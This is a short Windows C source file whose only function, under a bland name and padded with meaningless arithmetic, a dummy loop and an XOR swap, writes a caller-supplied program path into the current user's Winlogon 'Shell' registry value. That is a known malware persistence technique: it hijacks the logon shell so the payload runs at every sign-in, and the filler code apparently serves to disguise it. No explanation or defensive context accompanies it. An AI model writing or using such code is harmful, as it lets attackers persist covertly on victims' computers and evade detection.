#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* payload){
    int x = 10;
    int y = 20;
    if ((x * x + y * y) >= 0) {
        HKEY hKey;
        for(int i = 0; i < 1; i++) {
            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)payload, lstrlenA(payload));
                RegCloseKey(hKey);
            }
        }
    }
    x = x ^ y;
    y = x ^ y;
    x = x ^ y;
}